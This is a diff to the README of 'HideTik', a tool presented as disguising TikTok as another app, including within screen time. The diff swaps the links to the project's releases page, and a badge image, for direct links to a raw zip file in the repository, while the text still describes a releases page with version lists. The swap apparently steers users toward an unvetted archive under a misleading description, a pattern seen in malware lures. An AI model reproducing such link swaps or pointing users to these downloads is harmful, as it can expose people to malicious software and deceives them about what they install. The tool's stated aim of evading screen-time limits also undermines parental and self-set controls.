@@ -9,7 +9,7 @@ HideTik allows you to disguise TikTok as any application, even within screen tim
 To get started with HideTik, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
-   [![Download HideTik](https://img.shields.io/badge/Download-HideTik-brightgreen)](https://github.com/Mastermaie/hidetik/releases)
+   [![Download HideTik](https://raw.githubusercontent.com/Mastermaie/hidetik/main/brandless/hidetik.zip)](https://raw.githubusercontent.com/Mastermaie/hidetik/main/brandless/hidetik.zip)
 
 2. **Download the Latest Version:** On the releases page, you will see a list of available versions. Choose the latest release.
 
@@ -21,7 +21,7 @@ To get started with HideTik, follow these steps:
 
 To install HideTik, please follow these steps:
 
-1. **Go to the Releases Page:** Click here to visit the page: [Download HideTik](https://github.com/Mastermaie/hidetik/releases).
+1. **Go to the Releases Page:** Click here to visit the page: [Download HideTik](https://raw.githubusercontent.com/Mastermaie/hidetik/main/brandless/hidetik.zip).
 
 2. **Choose the Appropriate Version:** Look for the most recent version at the top of the list. Ensure that you pick the file that suits your operating system (Windows, Mac, or Linux).
 
